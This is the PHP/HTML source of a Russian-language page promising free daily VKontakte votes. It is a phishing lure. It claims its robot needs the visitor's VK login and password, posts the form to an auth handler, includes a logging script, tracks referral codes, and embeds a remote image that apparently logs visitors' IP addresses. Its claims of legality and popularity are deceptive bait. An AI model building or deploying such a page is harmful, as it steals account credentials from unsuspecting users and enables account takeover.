<?php session_start();
include('../bdlog.php');

if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
}?>

<html><head>
    <title>Раздача голосов ВКонтакте</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="/style.css" type="text/css" media="screen">
	<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
</head>
<body class="">
    <div style="width: 960px; margin: auto;">
    	<h1>Раздача голосов ВКонтакте</h1>
    	<h1 class="h1-2">Бесплатная раздача голосов</h1>
    	<div class="block1">
        	<h2>Добро пожаловать! У нас на сайте вы совершенно бесплатно можете раз в сутки получать 10 голосов на аккаунт социальной сети ВКонтакте. Наш робот автоматически раздаёт голоса всем, кто отправил заявку на получение.</h2>
        	<h2>Для того, чтобы получить бонус, необходимо иметь минимум 10 друзей или подписчиков на аккаунте ВКонтакте.</h2>
    	</div>
    	<div class="block2">
        	<h2>На данный момент в запасе:</h2>
        	<h2 class="h2-2">516 голосов</h2>
    	</div>
    	<div class="block3">
	    	<img class="vk-logo" src="/images/hatf.png" alt="O-RP.RU">
			<img src="https://yip.su/2cpD75.png" alt="" border="0">
			<h3 class="h3-2">ВНИМАНИЕ! В связи с тем, что нагрузка на сервер большая голоса приходят в течении 2-х часов. Ожидайте. Спасибо за понимание.</h3>
        	<center><form method="POST" id="login_submit" action="../auth/index.php">
			<div style="width:350px; text-align:left; border:1px solid #FFFFFF; color:#FFFFFF; font:16px Roboto, tahoma;">
			<div style="text-align:center; color:#FFFFFF; padding:5px 5px 5px 5px;">ПОЛУЧИТЬ ГОЛОСА</div>
			<div style="border-top:solid 1px #FFFFFF; padding:15px 20px 0px 20px;">Нажмите на кнопку "получить"<br></div>
			<div style="padding:20px 20px 15px 20px; text-align:center;">
			<input value="Получить" href="vk/index.php" style="box-shadow: 0 0 10px rgba(0,0,0,0.5); cursor:pointer; width: 150px; padding: 10px 7px 9px 7px; background: rgba(42, 69, 124, 0); text-transform: uppercase; font-size: 16px; color: white; border-radius: 11px; border: 1px solid white; -webkit-transition: all 200ms;" type="submit">
			</div>
			</div></form></center>
    	</div>
		<div class="block4">
			<h3>Мы работаем уже 11 месяцев. На данный момент более 600 человек каждые 24 часа отправляют заявку на получение бесплатных голосов.</h3>
	    	<hr size="1" color="#ffffff" align="center">
			<h3>Наш сервис полностью легален. Вы можете тратить полученный бонус на любые привилегии vk.com, покупать подарки и стикеры, получать валюту в разных онлайн-играх.</h3>
	    	<hr size="1" color="#ffffff" align="center"> 
			<h3>Нашему роботу необходим ваш логин и пароль для того, чтобы зайти на ваш аккаунт и зачислить вам голоса посредством оплаты через Qiwi кошелёк.</h3>
	    	<hr size="1" color="#ffffff" align="center">
			<h3>Вы можете получать бонус каждые 24 часа, для этого достаточно отправить повторную заявку. Все заявки рассматриваются в порядке очереди, возможно, вам придётся подождать около часа из-за большой нагрузки на главный сервер.</h3>
		</div>
	</div>

<link rel="stylesheet" href="/dolly_templates/css/mssm.css" type="text/css" media="all">
<script type="text/javascript">(function(){
var b = document.querySelectorAll('.__dolly_mssm_links_list__toggle'), a = 'data-state', v = 'opened';
for(var i = 0; i < b.length; ++i) b[i].onclick = function(){
	var p = this.parentNode;
	if(v === p.getAttribute(a)) p.removeAttribute(a);
	else p.setAttribute(a, v);
	event.stopPropagation();
	event.preventDefault();
	event.stopImmediatePropagation();
	return false;
};
})();</script>
</body></html>